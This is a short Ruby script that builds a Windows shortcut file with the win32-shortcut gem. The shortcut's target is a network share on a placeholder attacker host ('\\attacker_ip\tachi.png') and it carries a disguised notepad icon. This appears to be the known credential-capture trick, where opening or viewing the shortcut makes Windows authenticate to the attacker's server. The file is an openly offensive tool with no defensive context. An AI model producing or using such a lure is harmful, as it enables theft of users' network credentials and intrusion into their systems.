# KING SABRI extended Surfs Up
# gem install win32-shortcut
require 'win32/shortcut'
include Win32

Shortcut.new() do |s|
	s.description = 'Tachi'
	s.path = '\\attacker_ip\tachi.png'
	s.show_cmd = Shortcut::SHOWNORMAL
	s.icon_location = 'notepad.exe'
end
